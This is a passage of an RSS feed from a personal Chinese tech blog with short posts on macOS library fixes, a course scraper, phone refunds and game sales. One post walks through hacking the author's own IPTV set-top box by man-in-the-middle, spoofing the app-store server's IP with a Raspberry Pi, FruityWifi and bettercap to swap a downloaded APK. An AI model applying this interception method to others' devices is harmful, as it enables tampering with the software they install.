+查了下似乎是 readline 这个 lib 的问题， 用 brew info 查了下， 我的 readline 库是 8.0.0 版本
+1 2 3 4 5 6 7 $ ~ brew info readline readline: stable 8.0.0 (bottled) [keg-only] Library for command-line editing https://tiswww.case.edu/php/chet/readline/rltop.html /usr/local/Cellar/readline/8.0.0 (50 files, 1.5MB) Poured from bottle on 2019-03-04 at 12:08:49 From: https://github.com/Homebrew/homebrew-core/blob/master/Formula/readline.rb 说是更换下库版本就行，但是怕因此影响到其他东西，于是就没有搞， 后来再查资料发现了解决办法，
+解决方法 方法来源：StackOverflow
+在 /usr/local/opt/readline/lib/ 中，我的只有 libreadline.8.dylib
+只要把这个链接到 libreadline.6.dylib 和 libreadline.7.dylib 就能解决问题了。</description></item><item><title>在 NAS 上安装 TimeMachine</title><link>https://rankki.xyz/posts/macos-time-machine-backup-on-nas/</link><pubDate>Wed, 20 Feb 2019 00:36:56 +0000</pubDate><guid>https://rankki.xyz/posts/macos-time-machine-backup-on-nas/</guid><description/></item><item><title>Hack DTTV100 机顶盒</title><link>https://rankki.xyz/posts/hack-dttv100/</link><pubDate>Thu, 27 Dec 2018 17:36:21 +0000</pubDate><guid>https://rankki.xyz/posts/hack-dttv100/</guid><description>背景 联通给了个 IPTV 机顶盒， 看了下是 Android 4.4 系统的，在 Google 一圈之后，发现有人是通过硬件 hack 拿到权限的。但实际上这个机顶盒里面自带一个商店，需要下载， 那只要来个中间人替换应用市场的 apk 就行了。然后正好手上有个树莓派，（虽然说不用也行。 ）
+开始 hack 准备硬件 树莓派（刷好系统的） 网线 Wi-Fi 适配器（Pi3 可以忽略） 测试软件 树莓派设置好 Wi-Fi 连接， 安装 FruityWifi，并设置好 in(eth0) 和 out(wlan0),
+out 是树莓派和 AP 连接的， in 则是等下和机顶盒连接。
+之后安装 bettercap 或者其他类似的软件，可以嗅 http 连接的。
+监听 打开机顶盒，进入，并且把下载好的应用市场卸载掉。 使用 bettercap Duang！链接出来了。 可以看到有一个 http 的 get 请求，
+http://210.12.0.175:7084/launcher/data/1254621050/DSMClient20180727.apk
+替换文件 随后在 Fruity Wifi 里把 eth0 的地址设置成 210.12.0.175，就像下图
+之后 ssh 登陆到树莓派，新建一个/launcher/data/1254621050 目录，然后把其他应用市场的文件放进去并重命名为DSMClient20180727.apk
+并用 Python 也好，其他语言框架也好，在目录上搭建一个 file server，并设置端口为 7084</description></item><item><title>Monash Uni 课程</title><link>https://rankki.xyz/posts/monash-uni-units-search/</link><pubDate>Sun, 23 Dec 2018 10:44:29 +0000</pubDate><guid>https://rankki.xyz/posts/monash-uni-units-search/</guid><description>原来写过一个爬虫，爬Monash 2019 Handbook里课程的信息，比如有没有需要前置课程，有没有考试，有没有和其他课冲突。
+后来就完善了一下代码，并且将起整理出来，同时也写了个小前端，
+本来是用 python + flask 写的，但后来发现并没有什么需要后端操作的，
+于是就把数据用 json 格式储存在 github 上，并且用Vue.js写了个前端，用于搜索，同时不需要独立服务器。
+CSS 框架用的是MDUI, HTTP 请求部分用的是Axios, CDN 用的是Showfom家的。
+代码的位置是在github/rankki/moansh这里，然后使用的地址是在这个域名下rankki.xyz/monash
+信息包括了课的代码，名字，faculty，exam 和平时的其他 assessment 成绩，以及哪个学期有课，
+然后，因为是写的代码爬的数据，有可能会有信息不对， 如果有发现不对的，可以在 Telegram 联系到我。
+没想到，4 年后，2022-10-11，我竟然因为要选课对这个项目进行了更新。（我怎么还没毕业
+看了下 4 年前的代码，真的稚嫩，还有这篇内容里有好多排版问题。</description></item><item><title>伊織もえ - 宝多六花</title><link>https://rankki.xyz/posts/iorimoe-takarada-rikka/</link><pubDate>Sun, 28 Oct 2018 21:45:06 +0000</pubDate><guid>https://rankki.xyz/posts/iorimoe-takarada-rikka/</guid><description/></item><item><title>Apple 2018 特别发布会</title><link>https://rankki.xyz/posts/apple-special-event-2018/</link><pubDate>Thu, 13 Sep 2018 11:40:43 +0000</pubDate><guid>https://rankki.xyz/posts/apple-special-event-2018/</guid><description>&lt;p>今天凌晨，苹果在 Steve Jobs Theater 举办了 2018 年秋季发布会，发布了 iPhone XS、 iPhone XS Max、iPhone XR 和 Apple Watch Series 4 等新品。&lt;/p></description></item><item><title>Google 大法好, Nexus 5x 全款退</title><link>https://rankki.xyz/posts/nexus-5x-full-amount-refund/</link><pubDate>Thu, 19 Jul 2018 21:17:34 +0000</pubDate><guid>https://rankki.xyz/posts/nexus-5x-full-amount-refund/</guid><description>因为用的是 nexus 5x 上周五又出现 bootloop 的现象.
+为什么要加‘又’, 因为这是第二台.. 然后第一次换的时候跟我说不能退款, 只能换一部手机. 没办法就换了.
+然后上周五联系了下 Google support 说 24 小时内给邮件, 但因为是周五吧, 后来就没收到邮件. 于是今早又联系了下, 我跟他讲我试过所有方法都没法进去.
+然后他讲,&amp;lsquo;Oh okay&amp;rsquo;就跟我说因为停止了这台机器的生产, 所有就不能给我一个&amp;rsquo;replacement device&amp;rsquo;
+回了个 yes.
+然后回复我&amp;rsquo;However, I can help you with a full refund of the amount that was used to purchase the device.'
+白嫖两年的手机(doge
+再想到最近的&amp;rsquo;Google 因 Android 捆绑面临欧盟巨额罚款&amp;rsquo;, 感觉很惨..
+Btw 不可能买亲儿子了.</description></item><item><title>Python f-String</title><link>https://rankki.xyz/posts/python-f-string/</link><pubDate>Mon, 09 Jul 2018 12:41:09 +0000</pubDate><guid>https://rankki.xyz/posts/python-f-string/</guid><description/></item><item><title>宣传的作用</title><link>https://rankki.xyz/posts/role-of-propaganda/</link><pubDate>Thu, 05 Jul 2018 22:05:42 +0000</pubDate><guid>https://rankki.xyz/posts/role-of-propaganda/</guid><description>宣传的功能不在于对个体进行科学训练&amp;hellip;.. 宣传的全部艺术在于巧妙地把群众的注意力吸引到某个事实、某些做法、某些需求上面来&amp;hellip;. 不是要去教育那些渴望教育和知识的人，宣传的功效必须大部分瞄着情绪，而只在很小的程度上瞄着所谓的智力。&amp;hellip;.因此，它试图达到群众乐广大，它的纯智性水平就讲必须调的越低。&amp;hellip;..智性内涵越少，宣传就越有效。宣传的成效可不在于成功地取悦少数学者和爱美青年。&amp;hellip;.像科学教育那样从多方面来考虑看待问题，对宣传来说是个错误。广大群众的感受性是非常有限的，他们的智力是很低的，而他们的忘性却很大。&amp;hellip;..宣传的任务可不是对真理进行客观的研究。</description></item><item><title>Steam 夏促 2018</title><link>https://rankki.xyz/posts/steam-summer-sale-2018/</link><pubDate>Fri, 22 Jun 2018 10:59:00 +0000</pubDate><guid>https://rankki.xyz/posts/steam-summer-sale-2018/</guid><description>&lt;p>一个恐怖的事情，Steam 2018 的夏促开始了。6 月 21 日到 7 月 5(PDT)&lt;/p></description></item><item><title>Steam 账户消费查询</title><link>https://rankki.xyz/posts/steam-account-spend-check/</link><pubDate>Thu, 21 Jun 2018 17:20:35 +0000</pubDate><guid>https://rankki.xyz/posts/steam-account-spend-check/</guid><description>&lt;p>Steam 官方竟然支持查消费了。&lt;a href="https://help.steampowered.com/en/accountdata/AccountSpend">链接&lt;/a>&lt;/p></description></item><item><title>E3 2018</title><link>https://rankki.xyz/posts/e3-2018/</link><pubDate>Fri, 15 Jun 2018 13:32:40 +0000</pubDate><guid>https://rankki.xyz/posts/e3-2018/</guid><description>&lt;p>这篇主要是对 E3 2018 的一个收集整理，所有资料来源网络，多图 (总共大约 50MB)&lt;/p></description></item><item><title>Minecraft Mod 开发</title><link>https://rankki.xyz/posts/minecraft-mod-dev/</link><pubDate>Thu, 14 Jun 2018 16:25:24 +0000</pubDate><guid>https://rankki.xyz/posts/minecraft-mod-dev/</guid><description>&lt;p>因为某些原因，找不到合适的 mod，所以捡起来 Minecraft Mod 开发，其实在我刚玩 Minecraft 的时候也学过一点点，然后入坑了 Java，后来就放弃了。时隔多年，捡起 Mod 开发，加上在捡回的这个过程，发现网上很多资料没有 updated，于是边开发，边写这个文章。&lt;/p></description></item><item><title>AcFun 被黑</title><link>https://rankki.xyz/posts/acfun-was-pwned/</link><pubDate>Wed, 13 Jun 2018 11:13:22 +0000</pubDate><guid>https://rankki.xyz/posts/acfun-was-pwned/</guid><description>&lt;p>心疼 A 站，刚活起来，就被脱裤了&amp;hellip;&lt;/p></description></item><item><title>在 macOS 上使用 DNSCrypt-Proxy</title><link>https://rankki.xyz/posts/install-dnscrypt-proxy-on-macos/</link><pubDate>Mon, 11 Jun 2018 09:17:53 +0000</pubDate><guid>https://rankki.xyz/posts/install-dnscrypt-proxy-on-macos/</guid><description>&lt;p>&lt;a href="https://dnscrypt.info">DNSCrypt&lt;/a>是一个介于客户端和 DNS 服务商之间的认证式通讯协议，通俗来讲，DNSCrypt 阻止了运营商对你的 DNS 恶意劫持。&lt;/p></description></item><item><title>Hello World</title><link>https://rankki.xyz/posts/hello-world/</link><pubDate>Sun, 10 Jun 2018 23:34:23 +0000</pubDate><guid>https://rankki.xyz/posts/hello-world/</guid><description>&lt;p>开始用&lt;a href="https://hexo.io/">Hexo&lt;/a>写 Blog 了。部署在 GitHub Pages 上，也没有遇到什么坑，还是总结下吧，顺便练练写作。&lt;/p></description></item><item><title>About me</title><link>https://rankki.xyz/about/</link><pubDate>Sun, 10 Jun 2018 10:36:30 +0000</pubDate><guid>https://rankki.xyz/about/</guid><description>B.Comp.Sci. @ Monash FIT
+Contact me via:
+@RanKKI rankki.dev + @ + icloud + . + com @Hugh Liu 1 while(true) { code(); }</description></item><item><title>Bangumi</title><link>https://rankki.xyz/bangumi/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rankki.xyz/bangumi/</guid><description>下面是一些我看过或者想看的动漫，数据来源 api.bgm.tv。
+出于各种原因考虑，最多只显示 100 条。全部内容可以在 bgm.tv/anime/list/725320 看到。</description></item></channel></rss>
